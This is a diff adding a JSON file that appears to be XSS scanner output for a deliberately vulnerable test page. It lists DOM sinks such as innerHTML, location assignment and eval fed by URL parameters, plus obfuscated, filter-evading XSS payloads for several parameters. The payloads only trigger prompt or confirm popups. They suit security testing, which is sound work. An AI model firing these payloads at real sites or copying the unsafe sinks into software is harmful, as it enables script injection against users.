@@ -1,0 +1,116 @@
+[
+  {
+    "vulnerabilities": [
+      {
+        "vulnerability": "line : 5   var cS = document.location.search;"
+      },
+      {
+        "vulnerability": "line : 6   var sP = new URLSearchParams(cS);"
+      },
+      {
+        "vulnerability": "line : 7   var p25 = sP.get('p25');"
+      },
+      {
+        "vulnerability": "line : 8   var p26 = sP.get('p26');"
+      },
+      {
+        "vulnerability": "line : 9   var p27 = sP.get('p27');"
+      },
+      {
+        "vulnerability": "line : 12  if (p25 !== null) {"
+      },
+      {
+        "vulnerability": "line : 13  document.getElementById('h1').innerHTML = 'XSS ' + p25;"
+      },
+      {
+        "vulnerability": "line : 16  if (p26 !== null) {"
+      },
+      {
+        "vulnerability": "line : 17  document.location = p26;"
+      },
+      {
+        "vulnerability": "line : 20  if (p27 !== null) {"
+      },
+      {
+        "vulnerability": "line : 21  eval('n.p=' + p27.toLowerCase());"
+      },
+      {
+        "vulnerability": "line : 22  document.getElementById('h1').innerHTML = 'XSS ' + n.p;"
+      },
+      {
+        "vulnerability": "line : 3   if (document.location.search.match(\"p30\")) {"
+      },
+      {
+        "vulnerability": "line : 4   gym.innerHTML = \"\";"
+      }
+    ]
+  },
+  {
+    "payloads": [
+      {
+        "payload": "\"><a%0doNPOInTeREnTer%0a=%0a[8].find(confirm)>v3dm0s"
+      },
+      {
+        "payload": "\"><deTAIlS/+/oNTogGLe%09=%09[8].find(confirm)//"
+      },
+      {
+        "payload": "\"><a%0doNpoiNtereNter%0d=%0d(confirm)()%0dx>v3dm0s"
+      },
+      {
+        "payload": "\"><dEtaiLS%0aoNtOGgLE+=+(prompt)``>"
+      }
+    ],
+    "parameter": "p06"
+  },
+  {
+    "payloads": [
+      {
+        "payload": "'><d3v%0dOnmOuSEOvER%0d=%0da=prompt,a()>v3dm0s"
+      },
+      {
+        "payload": "'><d3V%09oNPoInTerENtEr+=+(prompt)``>v3dm0s"
+      },
+      {
+        "payload": "'><A%0aonPoINterENtER%0a=%0a(prompt)``>v3dm0s"
+      },
+      {
+        "payload": "'><D3v%0aoNPOiNtEReNTer%0a=%0a[8].find(confirm)%0dx>v3dm0s"
+      }
+    ],
+    "parameter": "p07"
+  },
+  {
+    "payloads": [
+      {
+        "payload": "\"%0aAUtofocuS%0aoNFOcus=\"(prompt)``"
+      },
+      {
+        "payload": "\"/+/AuTofOcUS/+/OnfOCUs=\"(prompt)``"
+      },
+      {
+        "payload": "\"%09autOfOCUs%09oNfocUs=\"confirm()"
+      },
+      {
+        "payload": "\"%09autoFOCUS%09OnFoCus=\"(prompt)``"
+      }
+    ],
+    "parameter": "p08"
+  },
+  {
+    "payloads": [
+      {
+        "payload": "'/+/AUtofoCUs/+/oNFOcUS='[8].find(confirm)"
+      },
+      {
+        "payload": "'%09aUTOfOCUS%09oNFoCus='confirm()"
+      },
+      {
+        "payload": "'%0aaUtOFOcus%0aoNFOcus='a=prompt,a()"
+      },
+      {
+        "payload": "'/+/autofOCUs/+/oNfoCUs='a=prompt,a()"
+      }
+    ],
+    "parameter": "p09"
+  }
+]
